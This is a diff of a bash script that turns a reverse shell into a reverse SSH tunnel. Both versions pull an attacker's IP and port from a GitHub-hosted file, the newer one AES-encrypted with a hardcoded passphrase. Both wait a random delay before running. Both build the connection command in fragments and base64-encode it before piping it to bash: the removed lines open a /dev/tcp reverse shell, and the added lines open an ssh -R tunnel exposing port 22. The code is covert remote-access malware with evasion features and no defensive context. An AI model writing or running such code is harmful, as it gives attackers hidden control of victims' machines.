@@ -1,29 +1,30 @@
 #!/bin/bash
 
-# URL pointing to GitHub file with format: IP:PORT
-GITHUB_URL="https://raw.githubusercontent.com/username/repo-name/main/connection.txt"
+# GitHub URL hosting AES-encrypted IP:PORT string
+GITHUB_URL="https://raw.githubusercontent.com/username/repo-name/main/encrypted.txt"
+KEY="yourSecretPassphrase"
 
-# Fetch IP and PORT
-DATA=$(curl -s "$GITHUB_URL")
-IP="${DATA%%:*}"
-PORT="${DATA##*:}"
+# Random delay: 60–240 seconds
+sleep $((RANDOM % 180 + 60))
 
-# Random delay between 45 and 240 seconds
-DELAY=$((RANDOM % 195 + 45))
-sleep "$DELAY"
+# Fetch & decrypt the connection data
+ENCODED=$(curl -s "$GITHUB_URL")
+DECRYPTED=$(echo "$ENCODED" | openssl enc -aes-256-cbc -d -a -salt -pass pass:"$KEY" 2>/dev/null)
 
-# Obfuscated command construction
-CMD1="bash"
-CMD2="-i"
-TARGET="/dev/tcp/$IP/$PORT"
-REDIR1="0>&1"
-REDIR2=">&"
+# Extract IP & Port
+R_IP="${DECRYPTED%%:*}"
+R_PORT="${DECRYPTED##*:}"
 
-# Construct full command
-FULL_CMD="$CMD1 $CMD2 $REDIR2 $TARGET $REDIR1"
+# SSH obfuscated command segments
+CMD1="ssh"
+CMD2="-N"
+CMD3="-R"
+CMD4="$R_PORT:localhost:22"
+CMD5="user@$R_IP"
 
-# Base64 encode the final command
-ENCODED=$(echo "$FULL_CMD" | base64)
+# Assemble and encode command
+SSH_CMD="$CMD1 $CMD2 $CMD3 $CMD4 $CMD5"
+ENCODED_CMD=$(echo "$SSH_CMD" | base64)
 
-# Decode and execute the reverse shell
-echo "$ENCODED" | base64 -d | bash
+# Execute reverse tunnel
+echo "$ENCODED_CMD" | base64 -d | bash
